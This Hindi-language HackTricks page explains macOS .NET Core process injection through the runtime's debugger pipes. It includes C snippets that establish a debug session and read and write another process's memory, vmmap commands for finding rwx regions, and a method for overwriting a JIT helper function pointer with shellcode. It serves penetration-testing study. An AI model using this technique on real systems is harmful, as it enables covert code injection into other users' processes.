# macOS .Net एप्लिकेशन इंजेक्शन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>

## .NET Core डिबगिंग <a href="#net-core-debugging" id="net-core-debugging"></a>

### **डिबगिंग सत्र स्थापित करना** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) डिबगर से डिबगी **संचार** को संभालने के लिए जिम्मेदार है।\
यह [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) में [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) को कॉल करके प्रति .Net प्रक्रिया के लिए 2 नाम पाइप बनाता है (एक **`-in`** में समाप्त होगा और दूसरा **`-out`** में और बाकी नाम समान होगा)।

तो, अगर आप उपयोगकर्ता के **`$TMPDIR`** में जाते हैं, तो आप .Net एप्लिकेशन को डिबग करने के लिए उपयोग कर सकने वाले **डिबगिंग fifos** पा सकेंगे:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

फंक्शन [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) एक डिबगर से संचार को संभालेगा।

एक डिबगर के लिए पहली आवश्यकता यह है कि एक **नया डिबगिंग सत्र बनाना** है। यह **`out` पाइप के माध्यम से एक संदेश भेजकर** किया जाता है जो `MessageHeader` संरचना से शुरू होता है, जिसे हम .NET स्रोत से प्राप्त कर सकते हैं:
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
नए सत्र अनुरोध के मामले में, यह संरचना इस प्रकार भरी जाती है:
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
एक बार निर्मित हो जाने के बाद, हम इसे `write` syscall का उपयोग करके **लक्ष्य को भेजते हैं**:
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
हमारे हेडर के अनुसार, हमें एक `sessionRequestData` संरचना भेजनी होगी, जिसमें एक GUID होता है जो हमारे सत्र की पहचान करता है:
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
हमारे सत्र अनुरोध को भेजने के बाद, हम **`out` पाइप से एक हेडर पढ़ते हैं** जो यह संकेत देगा **कि** क्या हमारा अनुरोध एक डीबगर सत्र स्थापित करने के लिए **सफल** रहा है या नहीं:
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### मेमोरी पढ़ें

एक डिबगिंग सत्र स्थापित होने के साथ, मेमोरी पढ़ना संभव है **read memory** का उपयोग करके संदेश प्रकार [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896)। कुछ मेमोरी पढ़ने के लिए मुख्य कोड आवश्यक होगा:
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
प्रूफ ऑफ कॉन्सेप्ट (POC) कोड [यहाँ](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b) पर मिल सकता है।

### मेमोरी लिखना
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
POC कोड जिसका इस्तेमाल इसके लिए किया गया है वह [यहाँ](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5) पर मिल सकता है।

### .NET Core कोड निष्पादन <a href="#net-core-code-execution" id="net-core-code-execution"></a>

सबसे पहली बात यह है कि उदाहरण के लिए एक मेमोरी क्षेत्र की पहचान करना जिसमें **`rwx`** चल रहा हो ताकि शेलकोड को चलाने के लिए सेव किया जा सके। यह आसानी से किया जा सकता है:
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
निष्पादन को ट्रिगर करने के लिए, यह जानना आवश्यक होगा कि कोई स्थान कहाँ है जहाँ एक फंक्शन पॉइंटर संग्रहीत है ताकि उसे ओवरराइट किया जा सके। **Dynamic Function Table (DFT)** के भीतर एक पॉइंटर को ओवरराइट करना संभव है, जिसका उपयोग .NET Core रनटाइम JIT संकलन के लिए सहायक फंक्शन प्रदान करने के लिए करता है। समर्थित फंक्शन पॉइंटर्स की सूची [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) में पाई जा सकती है।

x64 संस्करणों में यह सीधा है, **signature hunting** तकनीक का उपयोग करके **`libcorclr.dll`** में **`_hlpDynamicFuncTable`** सिंबल के संदर्भ की खोज करने के लिए, जिसे हम डीरेफरेंस कर सकते हैं:

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

अब जो बचा है वह यह है कि हमें एक पता खोजना होगा जहाँ से हम अपनी signature खोज शुरू कर सकते हैं। इसके लिए, हम एक और उजागर डीबगर फंक्शन, **`MT_GetDCB`** का लाभ उठाते हैं। यह लक्षित प्रक्रिया पर कई उपयोगी जानकारियां लौटाता है, लेकिन हमारे मामले में, हम एक फील्ड में रुचि रखते हैं जो एक **सहायक फंक्शन का पता** वापस करता है, **`m_helperRemoteStartAddr`**। इस पते का उपयोग करके, हम जानते हैं कि **`libcorclr.dll` लक्षित प्रक्रिया मेमोरी के भीतर कहाँ स्थित है** और हम DFT के लिए अपनी खोज शुरू कर सकते हैं।

इस पते को जानने के बाद हम फंक्शन पॉइंटर को हमारे shellcodes के साथ ओवरराइट कर सकते हैं।

PowerShell में इंजेक्ट करने के लिए इस्तेमाल किया गया पूरा POC कोड [यहाँ](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6) पाया जा सकता है।

## संदर्भ

* यह तकनीक [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/) से ली गई थी।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** और **hacktricks-cloud repo** में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
